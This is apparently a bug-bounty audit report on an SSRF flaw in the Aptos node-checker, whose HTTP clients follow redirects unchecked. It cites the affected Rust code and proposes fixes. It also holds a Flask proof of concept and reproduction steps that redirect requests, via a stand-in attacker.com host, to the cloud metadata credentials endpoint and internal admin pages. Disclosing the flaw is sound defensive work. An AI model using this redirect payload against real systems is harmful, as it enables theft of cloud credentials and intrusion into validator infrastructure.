# Audit Report

## Title
HTTP Redirect Following Vulnerability in Node Checker Enables SSRF Attacks on Validator Infrastructure

## Summary
The Aptos node-checker component does not configure redirect policies for HTTP clients and does not validate final URLs after redirects. This allows malicious node operators to redirect the node-checker to arbitrary internal endpoints, enabling Server-Side Request Forgery (SSRF) attacks that could compromise validator infrastructure.

## Finding Description

The node-checker creates HTTP clients without disabling or restricting redirect following behavior. The reqwest HTTP client library follows up to 10 redirects by default, and none of the node-checker's client configurations override this behavior.

**Vulnerable Client Configurations:**

In `get_metrics_client()`, the client is created with only timeout and cookie configuration: [1](#0-0) 

In `get_api_client()`, similar configuration without redirect policy: [2](#0-1) 

In the NHC check client, only timeout is configured: [3](#0-2) 

**Vulnerable Request Flows:**

The MetricsProvider makes GET requests without URL validation after redirects: [4](#0-3) 

The SystemInformationProvider similarly lacks redirect validation: [5](#0-4) 

NHC health check requests also follow redirects without validation: [6](#0-5) 

**Cookie Store Amplification:**

The REST client builder enables cookie storage, which preserves cookies across redirects: [7](#0-6) 

**Attack Execution Path:**

1. Attacker registers a validator/fullnode with a malicious endpoint URL
2. Node-checker queries `http://attacker.com:9101/metrics`
3. Attacker's server responds with HTTP 302 redirect: `Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/`
4. Node-checker automatically follows redirect without validation
5. Request is sent to cloud metadata service with node-checker's IAM role
6. Response containing AWS/GCP credentials is returned
7. Attacker can extract credentials from logs or subsequent requests

Alternatively, attackers could redirect to:
- Internal admin panels: `http://127.0.0.1:8080/admin`
- Private network services: `http://192.168.1.100/config`
- Other validator infrastructure: `http://internal-db.validator.local:5432`

## Impact Explanation

This vulnerability enables SSRF attacks against validator infrastructure where the node-checker is deployed. While the node-checker itself does not directly affect consensus or blockchain state, it typically runs on validator infrastructure with elevated network access.

**Security Impact:**
- **Infrastructure Compromise**: Access to cloud metadata services can leak IAM credentials, enabling full validator infrastructure takeover
- **Internal Network Mapping**: Attackers can probe internal network topology and discover sensitive services
- **Privilege Escalation**: Compromised credentials could lead to validator private key theft or consensus manipulation
- **Information Disclosure**: Access to internal admin panels or configuration endpoints

This qualifies as **Medium severity** under the Aptos bug bounty program criteria as it can lead to validator infrastructure compromise, which indirectly threatens network security even though it doesn't directly manipulate blockchain state.

## Likelihood Explanation

**Likelihood: High**

The attack is straightforward to execute:
- **No authentication bypass required**: Any monitored node can return redirects
- **Simple HTTP response**: Only requires sending `302 Found` with `Location` header
- **Default behavior**: Exploits reqwest's default redirect-following
- **No validation checks**: Code performs no URL validation after redirects
- **Wide attack surface**: Multiple endpoints are vulnerable (metrics, system_information, API checks)

The only requirement is that the attacker controls a node being monitored by the node-checker, which is the intended use case for the tool.

## Recommendation

**Primary Fix: Disable Redirect Following**

Configure all HTTP clients to not follow redirects:

```rust
// In node_address.rs
pub fn get_metrics_client(&self, timeout: Duration) -> Result<reqwest::Client> {
    match self.metrics_port {
        Some(_) => Ok(reqwest::ClientBuilder::new()
            .timeout(timeout)
            .cookie_provider(self.cookie_store.clone())
            .redirect(reqwest::redirect::Policy::none())  // Add this line
            .build()
            .unwrap()),
        None => Err(anyhow!("Cannot build metrics client without a metrics port")),
    }
}
```

Apply the same fix to:
- `get_api_client()` in node_address.rs
- NHC client creation in fn-check-client/src/check.rs
- ClientBuilder in aptos-rest-client/src/client_builder.rs

**Alternative: Validate Redirect Destinations**

If redirects are necessary, validate the final URL:

```rust
let response = self.client.get(self.metrics_url.clone()).send().await?;

// Validate the final URL after redirects
let final_url = response.url();
if !is_same_host(&self.metrics_url, final_url) {
    return Err(ProviderError::ParseError(anyhow!(
        "Redirect to different host detected: {} -> {}", 
        self.metrics_url, 
        final_url
    )));
}
```

## Proof of Concept

**Malicious Server Setup:**

```python
# malicious_node.py
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/metrics')
def metrics():
    # Redirect to cloud metadata service
    return redirect('http://169.254.169.254/latest/meta-data/iam/security-credentials/', code=302)

@app.route('/system_information')
def system_info():
    # Redirect to internal admin panel
    return redirect('http://127.0.0.1:8080/admin', code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=9101)
```

**Reproduction Steps:**

1. Start malicious node: `python malicious_node.py`
2. Configure node-checker to monitor `http://attacker.com:9101`
3. Run node-checker: `cargo run -- check --node-url http://attacker.com:9101 --metrics-port 9101`
4. Observe in network logs that requests are made to `169.254.169.254` instead of `attacker.com`
5. If running on AWS EC2, the response will contain IAM credentials

**Expected Behavior:**
The node-checker should either reject the redirect or validate that the final URL matches the expected host before making the request.

**Actual Behavior:**
The node-checker blindly follows the redirect to the attacker-controlled destination, potentially leaking sensitive information or accessing internal services.

## Notes

While the node-checker is not part of the core blockchain consensus protocol, it runs on validator infrastructure and has network access typical of trusted validator tooling. SSRF vulnerabilities in such components can serve as pivot points for broader infrastructure compromise, justifying the Medium severity classification. The fix is straightforward and should be applied to all HTTP client configurations in the node-checker codebase.

### Citations

**File:** ecosystem/node-checker/src/configuration/node_address.rs (L94-105)
```rust
    pub fn get_metrics_client(&self, timeout: Duration) -> Result<reqwest::Client> {
        match self.metrics_port {
            Some(_) => Ok(reqwest::ClientBuilder::new()
                .timeout(timeout)
                .cookie_provider(self.cookie_store.clone())
                .build()
                .unwrap()),
            None => Err(anyhow!(
                "Cannot build metrics client without a metrics port"
            )),
        }
    }
```

**File:** ecosystem/node-checker/src/configuration/node_address.rs (L107-115)
```rust
    pub fn get_api_client(&self, timeout: Duration) -> Result<AptosRestClient> {
        let client = reqwest::ClientBuilder::new()
            .timeout(timeout)
            .cookie_provider(self.cookie_store.clone())
            .build()
            .unwrap();

        Ok(AptosRestClient::from((client, self.get_api_url()?)))
    }
```

**File:** ecosystem/node-checker/fn-check-client/src/check.rs (L62-65)
```rust
        let nhc_client = ReqwestClient::builder()
            .timeout(Duration::from_secs(self.nhc_timeout_secs))
            .build()
            .expect("Somehow failed to build reqwest client");
```

**File:** ecosystem/node-checker/fn-check-client/src/check.rs (L220-233)
```rust
        let response = match nhc_client
            .get(nhc_address.clone())
            .query(&params)
            .send()
            .await
        {
            Ok(response) => response,
            Err(e) => {
                return SingleCheckResult::NodeCheckFailure(NodeCheckFailure::new(
                    format!("Error with request flow to NHC: {:#}", e),
                    NodeCheckFailureCode::RequestResponseError,
                ));
            },
        };
```

**File:** ecosystem/node-checker/src/provider/metrics.rs (L60-66)
```rust
        let response = self
            .client
            .get(self.metrics_url.clone())
            .send()
            .await
            .with_context(|| format!("Failed to get data from {}", self.metrics_url))
            .map_err(|e| ProviderError::RetryableEndpointError("/metrics", e))?;
```

**File:** ecosystem/node-checker/src/provider/system_information.rs (L58-64)
```rust
        let response = self
            .client
            .get(self.metrics_url.clone())
            .send()
            .await
            .with_context(|| format!("Failed to get data from {}", self.metrics_url))
            .map_err(|e| ProviderError::RetryableEndpointError("/system_information", e))?;
```

**File:** crates/aptos-rest-client/src/client_builder.rs (L95-109)
```rust
    pub fn build(self) -> Client {
        let version_path_base = get_version_path_with_base(self.base_url.clone());

        Client {
            inner: self
                .reqwest_builder
                .default_headers(self.headers)
                .timeout(self.timeout)
                .cookie_store(true)
                .build()
                .unwrap(),
            base_url: self.base_url,
            version_path_base,
        }
    }
```
